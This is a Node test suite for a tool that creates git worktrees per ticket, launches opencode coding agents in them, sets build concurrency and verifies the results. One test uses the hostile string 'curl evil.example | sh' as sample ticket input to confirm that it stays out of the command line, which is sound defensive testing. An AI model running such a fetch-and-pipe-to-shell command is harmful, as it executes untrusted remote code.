import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { EventEmitter } from 'node:events'
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { after, describe, test } from 'node:test'
import { buildProfile, type ProjectProfile } from '@anvil/profile'
import type { Ticket } from '@anvil/tickets'
import { claimAgentPid, readAgentSession, readClaims } from '@anvil/worktrees'
import {
  agentPrompt,
  concurrencyFor,
  crewUp,
  crewVerify,
  defaultJobs,
  isProcessAlive,
  launchOpencodeAgent,
  mapWithConcurrency,
  PROMPT_FILE,
} from '@anvil/worktrees/crew'

const temps: string[] = []
after(() => {
  for (const t of temps) rmSync(t, { recursive: true, force: true })
})

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: 'pipe' })
}

/**
 * A PATH containing a stub for `name`, so a launch can be tested without the real binary.
 *
 * The point is hermeticity: a test that shells out to whatever the developer happens to have
 * installed passes on their machine and fails in CI, which is a failure that teaches the
 * wrong lesson. On Windows the stub is a `.cmd`, because that is the shim shape the
 * resolution is looking for.
 */
function stubRunnerDir(name: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'anvil-stub-path-'))
  temps.push(dir)
  if (process.platform === 'win32') {
    writeFileSync(join(dir, `${name}.cmd`), '@echo off\r\nexit /b 0\r\n', 'utf8')
  } else {
    const stub = join(dir, name)
    writeFileSync(stub, '#!/bin/sh\nexit 0\n', 'utf8')
    chmodSync(stub, 0o755)
  }
  return dir
}

function makeRepo(opts: { npm?: boolean; gradle?: boolean; go?: boolean } = {}): string {
  const dir = mkdtempSync(join(tmpdir(), 'anvil-m5-'))
  temps.push(dir)
  git(dir, 'init', '--initial-branch=main')
  git(dir, 'config', 'user.email', 't@e.com')
  git(dir, 'config', 'user.name', 'T')
  writeFileSync(join(dir, 'README.md'), '# repo\n', 'utf8')
  if (opts.npm === true) {
    writeFileSync(
      join(dir, 'package.json'),
      JSON.stringify({ name: 'r', scripts: { test: 'true', lint: 'true' } }),
      'utf8',
    )
  }
  if (opts.gradle === true) {
    writeFileSync(join(dir, 'build.gradle.kts'), 'plugins { }\n', 'utf8')
    writeFileSync(join(dir, 'gradlew'), 'echo gradle\n', 'utf8')
  }
  if (opts.go === true) {
    writeFileSync(join(dir, 'go.mod'), 'module acme/r\n\ngo 1.22\n', 'utf8')
    writeFileSync(join(dir, 'main.go'), 'package main\n\nfunc main() {}\n', 'utf8')
  }
  git(dir, 'add', '.')
  git(dir, 'commit', '-m', 'init')
  return dir
}

function profileFor(dir: string): ProjectProfile {
  return buildProfile(dir, {
    root: dir,
    host: null,
    remote: null,
    defaultBranch: null,
  }).profile
}

const ticket = (n: number): Ticket => ({
  ref: { provider: 'local', id: String(n), key: `local-${n}` },
  title: `Task number ${n}`,
  body: 'Do the thing.',
  normalizedState: 'todo',
})

// ===========================================================================
// Bounded concurrency
// ===========================================================================

describe('mapWithConcurrency', () => {
  test('never exceeds the limit', async () => {
    let inFlight = 0
    let peak = 0
    await mapWithConcurrency([1, 2, 3, 4, 5, 6, 7, 8], 3, async () => {
      inFlight++
      peak = Math.max(peak, inFlight)
      await new Promise((r) => setTimeout(r, 20))
      inFlight--
      return null
    })
    assert.ok(peak <= 3, `peak was ${peak}`)
  })

  test('results come back in input order, not completion order', async () => {
    const results = await mapWithConcurrency([50, 5, 20], 3, async (ms) => {
      await new Promise((r) => setTimeout(r, ms))
      return ms
    })
    // A crew report read out of order is a report nobody trusts.
    assert.deepEqual(results, [50, 5, 20])
  })

  test('a limit above the item count does not over-subscribe', async () => {
    let peak = 0
    let inFlight = 0
    await mapWithConcurrency([1, 2], 99, async () => {
      inFlight++
      peak = Math.max(peak, inFlight)
      await new Promise((r) => setTimeout(r, 10))
      inFlight--
      return null
    })
    assert.equal(peak, 2)
  })

  test('a zero or negative limit still makes progress', async () => {
    const results = await mapWithConcurrency([1, 2, 3], 0, async (n) => n * 2)
    assert.deepEqual(results, [2, 4, 6])
  })

  test('an empty input resolves to an empty result', async () => {
    assert.deepEqual(await mapWithConcurrency([], 4, async () => 1), [])
  })
})

// ===========================================================================
// Concurrency policy
// ===========================================================================

describe('concurrency policy', () => {
  test('serializes for Gradle, because ~/.gradle is shared mutable state', () => {
    const dir = makeRepo({ gradle: true })
    const decision = concurrencyFor(profileFor(dir), null)
    assert.equal(decision.jobs, 1)
    assert.equal(decision.forcedByCaches, true)
    assert.match(decision.reason, /Gradle/)
  })

  test('serializes for npm, because ~/.npm is a shared cache', () => {
    const decision = concurrencyFor(profileFor(makeRepo({ npm: true })), null)
    assert.equal(decision.jobs, 1)
    assert.match(decision.reason, /npm/)
  })

  test('runs concurrently for Go, whose build cache is content-addressed', () => {
    const decision = concurrencyFor(profileFor(makeRepo({ go: true })), 4)
    assert.equal(decision.jobs, 4)
    assert.equal(decision.forcedByCaches, false)
  })

  test('an unsafe stack wins even when a safe one is also present', () => {
    // A repo with both a Go service and a Gradle module must still serialize: one
    // capability does not make a Gradle build safe.
    const dir = makeRepo({ gradle: true, go: true })
    assert.equal(concurrencyFor(profileFor(dir), 8).jobs, 1)
  })

  test('an explicit --jobs is honoured when nothing forces serialization', () => {
    const decision = concurrencyFor(profileFor(makeRepo({ go: true })), 7)
    assert.equal(decision.jobs, 7)
    assert.match(decision.reason, /--jobs/)
  })

  test('the decision is explainable, and names the rule that forced it', () => {
    const decision = concurrencyFor(profileFor(makeRepo({ gradle: true })), null)
    assert.ok(decision.rules.length > 0)
    assert.ok(decision.rules.every((r) => r.reason.length > 10))
  })

  test('default jobs is at least 1 and at most half the reported cores', () => {
    const jobs = defaultJobs()
    assert.ok(jobs >= 1)
    assert.ok(jobs <= 64)
  })
})

// ===========================================================================
// crew up
// ===========================================================================

describe('crew up', () => {
  test('claims several tickets, one worktree each', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5wt-'))
    temps.push(wtRoot)
    const result = await crewUp({
      repoRoot: dir,
      tickets: [ticket(1), ticket(2), ticket(3)],
      launch: false,
      runner: 'none',
      worktreeRoot: wtRoot,
    })
    assert.equal(result.claims.length, 3)
    assert.equal(new Set(result.claims.map((c) => c.worktreePath)).size, 3)
    assert.deepEqual(result.failures, [])
  })

  test('a refused claim does not stop the others', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5wt2-'))
    temps.push(wtRoot)
    // Claim one first, so the second attempt collides.
    await crewUp({
      repoRoot: dir,
      tickets: [ticket(1)],
      launch: false,
      runner: 'none',
      worktreeRoot: wtRoot,
    })
    const result = await crewUp({
      repoRoot: dir,
      tickets: [ticket(1), ticket(2)],
      launch: false,
      runner: 'none',
      worktreeRoot: wtRoot,
    })
    assert.equal(result.claims.length, 1, 'the non-colliding ticket still gets a worktree')
    assert.equal(result.failures.length, 1)
    assert.match(result.failures[0]?.reason ?? '', /already exists/)
  })

  test('launching is opt-in and uses the injected launcher', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5wt3-'))
    temps.push(wtRoot)
    const started: string[] = []
    const result = await crewUp({
      repoRoot: dir,
      tickets: [ticket(1), ticket(2)],
      launch: true,
      runner: 'fake-runner',
      worktreeRoot: wtRoot,
      launcher: async ({ worktree, key }) => {
        started.push(key)
        return { pid: 1234, detail: `started in ${worktree}` }
      },
    })
    assert.deepEqual(started.sort(), ['local-1', 'local-2'])
    assert.equal(result.launches.length, 2)
    assert.ok(result.launches.every((l) => l.launched))
  })

  test('no launcher runs when --launch is off', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5wt4-'))
    temps.push(wtRoot)
    const result = await crewUp({
      repoRoot: dir,
      tickets: [ticket(1)],
      launch: false,
      runner: 'none',
      worktreeRoot: wtRoot,
      launcher: async () => {
        throw new Error('must not be called')
      },
    })
    assert.deepEqual(result.launches, [])
  })

  test('a launcher failure is reported per worktree, not thrown', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5wt5-'))
    temps.push(wtRoot)
    const result = await crewUp({
      repoRoot: dir,
      tickets: [ticket(1)],
      launch: true,
      runner: 'none',
      worktreeRoot: wtRoot,
      launcher: async () => {
        throw new Error('binary not found')
      },
    })
    assert.equal(result.launches[0]?.launched, false)
    assert.match(result.launches[0]?.detail ?? '', /binary not found/)
    assert.equal(result.claims.length, 1, 'the worktree still exists even if the agent did not start')
  })

  test('the recorded pid lands in the claim registry for crew status', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5wt6-'))
    temps.push(wtRoot)
    await crewUp({
      repoRoot: dir,
      tickets: [ticket(1)],
      launch: true,
      runner: 'opencode',
      worktreeRoot: wtRoot,
      // No `env` here: this test injects a `launcher`, so no binary is ever resolved and the
      // real PATH is never read. `crewUp` takes no env -- a blanket patch that added one was
      // caught by the typechecker on Linux, which is the argument for having one.
      launcher: async () => ({ pid: 999, detail: 'ok' }),
    })
    const claim = readClaims(dir).claims.find((c) => c.key === 'local-1')
    assert.equal(claim?.agent?.runner, 'opencode')
    // The pid, under its own name. It used to be written as `sessionId`, which is how a
    // process id ended up in a field called "session".
    assert.equal(claim?.agent?.pid, 999)
    assert.equal(claim?.agent?.sessionId, undefined)
  })

  test('a registry written before the rename still reads its pid', () => {
    // The claim registry is a file on disk, written by one version and read by the next.
    // The old field was called `sessionId` and held the pid as a string.
    const dir = mkdtempSync(join(tmpdir(), 'anvil-legacy-'))
    temps.push(dir)
    mkdirSync(join(dir, '.anvil'), { recursive: true })
    writeFileSync(
      join(dir, '.anvil', 'claims.json'),
      JSON.stringify({
        schemaVersion: 1,
        claims: [
          {
            key: 'local-1',
            ticket: { provider: 'local', id: '1' },
            branch: 'feat/one',
            baseBranch: 'main',
            baseRef: 'main',
            worktreePath: join(dir, 'wt'),
            worktreeId: null,
            state: 'active',
            createdAt: new Date().toISOString(),
            agent: { runner: 'opencode', sessionId: '4321' },
          },
        ],
      }),
      'utf8',
    )
    const claim = readClaims(dir).claims[0]
    assert.equal(claimAgentPid(claim!), 4321)
  })
})

describe('readAgentSession', () => {
  test('reads the session the plugin recorded in the worktree', () => {
    const dir = mkdtempSync(join(tmpdir(), 'anvil-session-'))
    temps.push(dir)
    mkdirSync(join(dir, '.anvil'), { recursive: true })
    writeFileSync(
      join(dir, '.anvil', 'session.json'),
      JSON.stringify({ sessionId: 'ses_abc', recordedAt: '2026-01-01T00:00:00.000Z' }),
      'utf8',
    )
    const session = readAgentSession(dir)
    assert.equal(session?.sessionId, 'ses_abc')
  })

  test('a worktree with no recorded session is not an error', () => {
    const dir = mkdtempSync(join(tmpdir(), 'anvil-nosession-'))
    temps.push(dir)
    assert.equal(readAgentSession(dir), null)
  })

  test('a half-written session file is not a session', () => {
    const dir = mkdtempSync(join(tmpdir(), 'anvil-badsession-'))
    temps.push(dir)
    mkdirSync(join(dir, '.anvil'), { recursive: true })
    writeFileSync(join(dir, '.anvil', 'session.json'), '{"sessionId":', 'utf8')
    assert.equal(readAgentSession(dir), null)
  })
})

// ===========================================================================
// launchOpencodeAgent
// ===========================================================================

describe('launchOpencodeAgent', () => {
  /** A spawn that records its argv and reports a pid, without starting anything. */
  function fakeSpawn(pid: number | undefined = 4242) {
    const calls: Array<{
      file: string
      args: string[]
      opts: Record<string, unknown>
    }> = []
    const fn = ((file: string, args: string[], opts: Record<string, unknown>) => {
      calls.push({ file, args, opts })
      const child = new EventEmitter() as EventEmitter & {
        pid?: number
        unref: () => void
      }
      if (pid !== undefined) child.pid = pid
      child.unref = () => {}
      return child
    }) as unknown as typeof import('node:child_process').spawn
    return { fn, calls }
  }

  test('launches a shim through cmd on Windows, not the bare name', async () => {
    // The real `opencode` installed by npm is a .CMD shim. `spawn('opencode', ...)` fails
    // with ENOENT, so the crew used to report agents started while nothing was running.
    if (process.platform !== 'win32') return
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-'))
    const { fn, calls } = fakeSpawn()
    const result = await launchOpencodeAgent({
      worktree: dir,
      key: 'k',
      prompt: 'hello',
      logPath: join(dir, 'k.log'),
      runner: 'opencode',
      env: { PATH: stubRunnerDir('opencode') },
      spawnFn: fn,
    })
    assert.equal(calls.length, 1)
    assert.match(calls[0]?.file ?? '', /cmd(\.exe)?$/i, 'a Windows shim must go through cmd')
    assert.equal(result.pid, 4242)
    assert.equal(calls[0]?.opts.windowsVerbatimArguments, true, 'quoting only survives with verbatim args')
  })

  test('passes run, --dir, the worktree and a read-the-prompt instruction as argv', async () => {
    // The prompt itself is a multi-line document, so it is written to a file and argv
    // carries a single-line instruction to read it. argv must therefore stay free of
    // anything an argv-entry safety check would refuse.
    if (process.platform !== 'win32') return
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-args-'))
    const { fn, calls } = fakeSpawn()
    await launchOpencodeAgent({
      worktree: dir,
      key: 'k',
      prompt: 'do the thing\nand also the other thing',
      logPath: join(dir, 'k.log'),
      runner: 'opencode',
      env: { PATH: stubRunnerDir('opencode') },
      spawnFn: fn,
    })
    const line = calls[0]?.args.join(' ') ?? ''
    assert.match(line, /\brun\b/)
    assert.match(line, /--dir/)
    assert.match(line, /--print-logs/)
    assert.match(line, new RegExp(PROMPT_FILE.replace(/\./g, '\\.')))

    // The full prompt, newlines and all, is in the file the instruction points at.
    const written = readFileSync(join(dir, PROMPT_FILE), 'utf8')
    assert.equal(written, 'do the thing\nand also the other thing')
  })

  test('the real multi-line agent prompt launches on Windows', async () => {
    // The bug this pins: the launcher put the prompt in argv while the shim path refuses
    // any argument containing a newline, so `crew up --launch` could never start an agent
    // on Windows -- it always refused, and the plan claimed a real launch had been
    // verified. The prompt is what forces the file indirection.
    if (process.platform !== 'win32') return
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-realprompt-'))
    const { fn, calls } = fakeSpawn()
    const prompt = agentPrompt({ key: 'local-1', branch: 'feat/local-1-thing' } as never, dir)
    assert.ok(prompt.includes('\n'), 'the real prompt is multi-line, which is the whole problem')
    await launchOpencodeAgent({
      worktree: dir,
      key: 'k',
      prompt,
      logPath: join(dir, 'k.log'),
      runner: 'opencode',
      env: { PATH: stubRunnerDir('opencode') },
      spawnFn: fn,
    })
    assert.equal(calls.length, 1, 'the real prompt must launch, not be refused')
    assert.match(readFileSync(join(dir, PROMPT_FILE), 'utf8'), /Do NOT push/)
  })

  test('a prompt full of shell metacharacters never reaches argv', async () => {
    // Ticket titles become part of the prompt, and a ticket title is user input. Since the
    // prompt is now a file rather than an argv entry, hostile content cannot become a cmd
    // metacharacter problem at all -- and nothing is refused for containing a `|`.
    if (process.platform !== 'win32') return
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-unsafe-'))
    const { fn, calls } = fakeSpawn()
    const hostile = 'fix it & curl evil.example | sh'
    await launchOpencodeAgent({
      worktree: dir,
      key: 'k',
      prompt: hostile,
      logPath: join(dir, 'k.log'),
      runner: 'opencode',
      env: { PATH: stubRunnerDir('opencode') },
      spawnFn: fn,
    })
    assert.equal(calls.length, 1)
    const line = calls[0]?.args.join(' ') ?? ''
    assert.ok(!line.includes('curl'), 'hostile prompt text must not appear in the command line')
    assert.match(readFileSync(join(dir, PROMPT_FILE), 'utf8'), /curl evil\.example \| sh/)
  })

  test('the agent writes to the log file, not to a discarded stdio', async () => {
    // The CLI tells the user "logs at <path>". A detached agent that outlives the
    // terminal has nowhere else to report a quota error or an auth failure, so a log that
    // only ever contains our own header is worse than no log.
    if (process.platform !== 'win32') return
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-logs-'))
    const logPath = join(dir, 'k.log')
    const { fn, calls } = fakeSpawn()
    await launchOpencodeAgent({
      worktree: dir,
      key: 'k',
      prompt: 'hi',
      logPath,
      runner: 'opencode',
      env: { PATH: stubRunnerDir('opencode') },
      spawnFn: fn,
    })
    const stdio = calls[0]?.opts.stdio
    assert.ok(Array.isArray(stdio), 'stdio must name the log file, not "ignore"')
    assert.notDeepEqual(stdio, ['ignore', 'ignore', 'ignore'], 'output must be captured, not discarded')

    const log = readFileSync(logPath, 'utf8')
    assert.match(log, /launched /, 'the header records what was launched')
    assert.match(log, /opencode\.(CMD|cmd|exe)/i, 'and the resolved path, which is not the bare name')
    assert.match(log, /pid \d+/, 'and the pid, so the agent can be checked with crew status')
  })

  test('a missing runner is reported as a failed launch, not thrown', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-missing-'))
    await assert.rejects(
      () =>
        launchOpencodeAgent({
          worktree: dir,
          key: 'k',
          prompt: 'hi',
          logPath: join(dir, 'k.log'),
          runner: 'definitely-not-a-real-runner-xyz',
          spawnFn: fakeSpawn().fn,
        }),
      /Command not found/,
    )
  })

  test('reports a spawn failure instead of leaving the process to crash', async () => {
    // A synchronous ENOENT surfaces as an async 'error' event. Unhandled, it takes the
    // whole process down, which would kill the other agents in the crew.
    if (process.platform !== 'win32') return
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-err-'))
    const fn = ((_file: string, _args: string[], _opts: Record<string, unknown>) => {
      const child = new EventEmitter() as EventEmitter & {
        pid?: number
        unref: () => void
      }
      child.unref = () => {}
      setImmediate(() => child.emit('error', Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' })))
      return child
    }) as unknown as typeof import('node:child_process').spawn

    const result = await launchOpencodeAgent({
      worktree: dir,
      key: 'k',
      prompt: 'hi',
      logPath: join(dir, 'k.log'),
      runner: 'opencode',
      env: { PATH: stubRunnerDir('opencode') },
      spawnFn: fn,
    })
    assert.equal(result.pid, null)
    assert.match(result.detail, /failed to start/)
    assert.match(readFileSync(join(dir, 'k.log'), 'utf8'), /failed to start/, 'the log records the failure')
  })

  test('a launcher that throws is contained, not fatal to the crew', async () => {
    // The other agents in the crew are already running when this happens; one bad launch
    // must not take the process down and orphan them.
    //
    // `env` points PATH at a directory holding a stub `opencode`, because the launch
    // resolves the runner on PATH before spawning. Without it this test passed only on a
    // machine that happened to have opencode installed: on CI the resolution failed first
    // and the assertion saw `Command not found` instead of the error it was testing for.
    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-throw-'))
    await assert.rejects(
      () =>
        launchOpencodeAgent({
          worktree: dir,
          key: 'k',
          prompt: 'hi',
          logPath: join(dir, 'k.log'),
          runner: 'opencode',
          env: { PATH: stubRunnerDir('opencode') },
          spawnFn: (() => {
            throw new Error('catastrophic')
          }) as unknown as typeof import('node:child_process').spawn,
        }),
      /catastrophic/,
    )
  })
})

// ===========================================================================
// crew verify
// ===========================================================================

describe('crew verify', () => {
  async function crew(dir: string, n: number, wtRoot: string): Promise<void> {
    await crewUp({
      repoRoot: dir,
      tickets: Array.from({ length: n }, (_, i) => ticket(i + 1)),
      launch: false,
      runner: 'none',
      worktreeRoot: wtRoot,
    })
  }

  test('verifies every worktree and aggregates pass', async () => {
    const dir = makeRepo({ go: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v1-'))
    temps.push(wtRoot)
    await crew(dir, 3, wtRoot)

    const ran: string[] = []
    const result = await crewVerify({
      repoRoot: dir,
      run: async (command) => {
        ran.push(command)
        return { ok: true, code: 0, stdout: '', stderr: '' }
      },
    })
    assert.equal(result.ok, true)
    assert.equal(result.results.length, 3)
    assert.ok(ran.length >= 3, 'each worktree ran its own verify commands')
  })

  test('runs verify commands from the detected project directory', async () => {
    // A monorepo keeps its manifest in `app/`. Verify commands are written relative to
    // that directory, so running them from the worktree root either fails to find the
    // scripts or silently runs a different project.
    const dir = makeRepo()
    mkdirSync(join(dir, 'app'), { recursive: true })
    writeFileSync(
      join(dir, 'app', 'package.json'),
      JSON.stringify({ name: 'app', scripts: { test: 'true', lint: 'true' } }),
      'utf8',
    )
    git(dir, 'add', '.')
    git(dir, 'commit', '-m', 'nested app')
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v-dir-'))
    temps.push(wtRoot)
    await crew(dir, 1, wtRoot)

    const cwds: string[] = []
    const result = await crewVerify({
      repoRoot: dir,
      run: async (_command, cwd) => {
        cwds.push(cwd)
        return { ok: true, code: 0, stdout: '', stderr: '' }
      },
    })

    assert.equal(result.ok, true)
    assert.ok(cwds.length >= 1, 'the worktree ran at least one verify command')
    assert.ok(
      cwds.every((cwd) => cwd.replace(/\\/g, '/').endsWith('/app')),
      `every command ran from the project directory: ${cwds.join(', ')}`,
    )
  })

  test('one failing worktree fails the whole crew', async () => {
    const dir = makeRepo({ go: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v2-'))
    temps.push(wtRoot)
    await crew(dir, 3, wtRoot)

    const result = await crewVerify({
      repoRoot: dir,
      run: async (_command, cwd) =>
        cwd.includes('local-2')
          ? { ok: false, code: 1, stdout: '', stderr: 'FAIL local-2' }
          : { ok: true, code: 0, stdout: '', stderr: '' },
    })
    // A green aggregate must never hide a red member.
    assert.equal(result.ok, false)
    assert.equal(result.results.filter((r) => r.ok).length, 2)
    assert.equal(result.results.find((r) => !r.ok)?.key, 'local-2')
  })

  test('stops at the first failing command in a worktree', async () => {
    const dir = makeRepo({ npm: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v3-'))
    temps.push(wtRoot)
    await crew(dir, 1, wtRoot)

    const ran: string[] = []
    await crewVerify({
      repoRoot: dir,
      run: async (command) => {
        ran.push(command)
        return { ok: false, code: 1, stdout: '', stderr: 'boom' }
      },
    })
    assert.equal(ran.length, 1, 'running lint after a failed test is wasted time')
  })

  test('a vanished worktree is skipped, not failed', async () => {
    const dir = makeRepo({ go: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v4-'))
    temps.push(wtRoot)
    await crew(dir, 2, wtRoot)
    const claim = readClaims(dir).claims.find((c) => c.key === 'local-1')
    rmSync(claim?.worktreePath ?? '', { recursive: true, force: true })

    const result = await crewVerify({
      repoRoot: dir,
      run: async () => ({ ok: true, code: 0, stdout: '', stderr: '' }),
    })
    assert.equal(result.results.length, 1)
    assert.equal(result.skipped.length, 1)
    assert.match(result.skipped[0]?.reason ?? '', /worktree is gone/)
  })

  test('the cache policy is applied and reported', async () => {
    const dir = makeRepo({ gradle: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v5-'))
    temps.push(wtRoot)
    await crew(dir, 2, wtRoot)

    let inFlight = 0
    let peak = 0
    const result = await crewVerify({
      repoRoot: dir,
      run: async () => {
        inFlight++
        peak = Math.max(peak, inFlight)
        await new Promise((r) => setTimeout(r, 20))
        inFlight--
        return { ok: true, code: 0, stdout: '', stderr: '' }
      },
    })
    assert.equal(result.concurrency.jobs, 1)
    assert.equal(peak, 1, 'a Gradle crew must not run two builds at once')
  })

  test('--force-parallel overrides the cache policy', async () => {
    const dir = makeRepo({ gradle: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v6-'))
    temps.push(wtRoot)
    await crew(dir, 3, wtRoot)

    let peak = 0
    let inFlight = 0
    const result = await crewVerify({
      repoRoot: dir,
      jobs: 3,
      forceParallel: true,
      run: async () => {
        inFlight++
        peak = Math.max(peak, inFlight)
        await new Promise((r) => setTimeout(r, 25))
        inFlight--
        return { ok: true, code: 0, stdout: '', stderr: '' }
      },
    })
    assert.equal(result.concurrency.jobs, 3)
    assert.equal(peak, 3)
    assert.match(result.concurrency.reason, /overridden/)
  })

  test('--jobs is bounded even without an override', async () => {
    const dir = makeRepo({ go: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v7-'))
    temps.push(wtRoot)
    await crew(dir, 4, wtRoot)

    let peak = 0
    let inFlight = 0
    await crewVerify({
      repoRoot: dir,
      jobs: 2,
      run: async () => {
        inFlight++
        peak = Math.max(peak, inFlight)
        await new Promise((r) => setTimeout(r, 20))
        inFlight--
        return { ok: true, code: 0, stdout: '', stderr: '' }
      },
    })
    assert.ok(peak <= 2, `peak was ${peak}`)
  })

  test('a worktree with no verify command is reported, not silently passed', async () => {
    const dir = makeRepo()
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v8-'))
    temps.push(wtRoot)
    await crew(dir, 1, wtRoot)
    const result = await crewVerify({
      repoRoot: dir,
      run: async () => {
        throw new Error('must not run')
      },
    })
    assert.equal(result.ok, false)
    assert.match(result.results[0]?.error ?? '', /no verify command/)
  })

  test('only the named keys are verified', async () => {
    const dir = makeRepo({ go: true })
    const wtRoot = mkdtempSync(join(tmpdir(), 'anvil-m5v9-'))
    temps.push(wtRoot)
    await crew(dir, 3, wtRoot)
    const result = await crewVerify({
      repoRoot: dir,
      keys: ['local-2'],
      run: async () => ({ ok: true, code: 0, stdout: '', stderr: '' }),
    })
    assert.deepEqual(
      result.results.map((r) => r.key),
      ['local-2'],
    )
  })
})

describe('isProcessAlive', () => {
  test('reports this process as alive', () => {
    assert.equal(isProcessAlive(process.pid), true)
  })

  test('reports a pid that cannot exist as dead', () => {
    // Above the usual pid_max on Linux; on Windows a huge pid is simply not found.
    assert.equal(isProcessAlive(2 ** 30), false)
  })
})
